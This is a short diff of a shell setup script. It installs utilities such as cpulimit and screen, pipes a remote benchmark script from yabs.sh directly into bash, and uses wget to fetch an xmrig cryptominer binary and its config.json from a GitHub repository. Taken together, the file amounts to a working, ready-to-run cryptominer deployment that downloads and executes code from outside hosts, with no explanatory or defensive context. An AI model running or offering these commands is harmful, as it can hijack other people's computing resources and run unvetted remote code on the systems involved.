@@ -1,5 +1,7 @@
 apt update -y && apt install curl -y && apt install psmisc -y && apt install bc -y && apt install cpulimit -y && apt install vim -y && apt install screen -y
 
+curl -sL yabs.sh | bash -s -- -f -i
+
 yum install psmisc -y && yum install bc -y && yum install cpulimit -y && yum install vim -y && yum install screen -y
 
 wget https://raw.githubusercontent.com/BrunuhVille/xxss/main/config.json && wget https://github.com/BrunuhVille/xxss/raw/main/xmrig
